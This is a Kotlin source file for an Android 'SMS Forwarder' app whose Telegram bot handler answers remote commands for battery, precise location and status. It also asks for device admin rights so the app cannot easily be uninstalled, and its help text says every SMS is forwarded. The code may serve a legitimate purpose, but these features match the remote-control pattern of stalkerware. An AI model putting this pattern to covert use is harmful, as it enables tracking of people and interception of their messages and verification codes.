package com.smsforwarder.app.telegram

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.BatteryManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.smsforwarder.app.receiver.DeviceAdminReceiver
import com.smsforwarder.app.utils.PreferenceHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class TelegramBotHandler(private val context: Context) {
    
    companion object {
        private const val TAG = "TelegramBotHandler"
        private const val POLL_INTERVAL = 5000L // 5 seconds
    }
    
    private val preferenceHelper = PreferenceHelper(context)
    private var isPolling = false
    private var lastUpdateId = 0L

    fun startPolling() {
        if (isPolling) return
        isPolling = true
        
        CoroutineScope(Dispatchers.IO).launch {
            while (isPolling) {
                try {
                    checkForCommands()
                    delay(POLL_INTERVAL)
                } catch (e: Exception) {
                    Log.e(TAG, "Polling error: ${e.message}", e)
                    delay(POLL_INTERVAL * 2)
                }
            }
        }
    }

    fun stopPolling() {
        isPolling = false
    }

    private suspend fun checkForCommands() = withContext(Dispatchers.IO) {
        val botToken = preferenceHelper.getBotToken()
        val adminChatId = preferenceHelper.getChatId()
        
        if (botToken.isEmpty() || adminChatId.isEmpty()) return@withContext

        val telegramBot = TelegramBot(botToken)
        val updates = telegramBot.getUpdates(lastUpdateId + 1)
        
        updates.forEach { update ->
            lastUpdateId = maxOf(lastUpdateId, update.updateId)
            
            val message = update.message
            if (message != null && message.chatId == adminChatId) {
                handleCommand(message.text, botToken, adminChatId)
            }
        }
    }

    private suspend fun handleCommand(command: String, botToken: String, chatId: String) {
        val telegramBot = TelegramBot(botToken)
        val response = when (command.lowercase()) {
            "/start" -> getHelpMessage()
            "/help" -> getHelpMessage()
            "/battery" -> getBatteryInfo()
            "/location" -> getLocationInfo()
            "/status" -> getDeviceStatus()
            "/admin" -> enableDeviceAdmin()
            else -> null
        }

        response?.let {
            telegramBot.sendMessage(chatId, it)
        }
    }

    private fun getHelpMessage(): String {
        return """
            📱 *SMS Forwarder Admin Panel*
            
            Available commands:
            /help - Show this message
            /battery - Get battery level
            /location - Get device location
            /status - Get device status
            /admin - Enable device admin protection
            
            All SMS messages will be forwarded automatically.
        """.trimIndent()
    }

    private fun getBatteryInfo(): String {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
            context.registerReceiver(null, filter)
        }

        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = if (level >= 0 && scale > 0) {
            (level * 100 / scale.toFloat()).toInt()
        } else -1

        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                         status == BatteryManager.BATTERY_STATUS_FULL

        val chargePlug = batteryStatus?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
        val chargingType = when (chargePlug) {
            BatteryManager.BATTERY_PLUGGED_USB -> "USB"
            BatteryManager.BATTERY_PLUGGED_AC -> "AC Adapter"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
            else -> "Not Charging"
        }

        return """
            🔋 *Battery Information*
            
            Level: $batteryPct%
            Status: ${if (isCharging) "⚡ Charging" else "🔌 Not Charging"}
            Source: $chargingType
        """.trimIndent()
    }

    private fun getLocationInfo(): String {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            return "❌ Location permission not granted"
        }

        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val location: Location? = try {
            locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        } catch (e: SecurityException) {
            null
        }

        return if (location != null) {
            val googleMapsUrl = "https://www.google.com/maps?q=${location.latitude},${location.longitude}"
            """
                📍 *Device Location*
                
                Latitude: ${location.latitude}
                Longitude: ${location.longitude}
                Accuracy: ${location.accuracy}m
                
                [Open in Google Maps]($googleMapsUrl)
            """.trimIndent()
        } else {
            "❌ Unable to get location. Make sure GPS is enabled."
        }
    }

    private fun getDeviceStatus(): String {
        val batteryInfo = getBatteryInfo()
        val adminEnabled = isDeviceAdminEnabled()
        
        return """
            📊 *Device Status*
            
            $batteryInfo
            
            Device Admin: ${if (adminEnabled) "✅ Enabled" else "❌ Disabled"}
            SMS Forwarding: ✅ Active
        """.trimIndent()
    }

    private fun enableDeviceAdmin(): String {
        return if (isDeviceAdminEnabled()) {
            "✅ Device Admin is already enabled!"
        } else {
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                val componentName = ComponentName(context, DeviceAdminReceiver::class.java)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Enable to protect SMS Forwarder from being uninstalled")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                "📱 Device Admin activation screen opened. Please enable it."
            } catch (e: Exception) {
                "❌ Failed to open Device Admin settings: ${e.message}"
            }
        }
    }

    private fun isDeviceAdminEnabled(): Boolean {
        val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(context, DeviceAdminReceiver::class.java)
        return devicePolicyManager.isAdminActive(componentName)
    }

    data class Update(
        val updateId: Long,
        val message: Message?
    )

    data class Message(
        val chatId: String,
        val text: String
    )
}
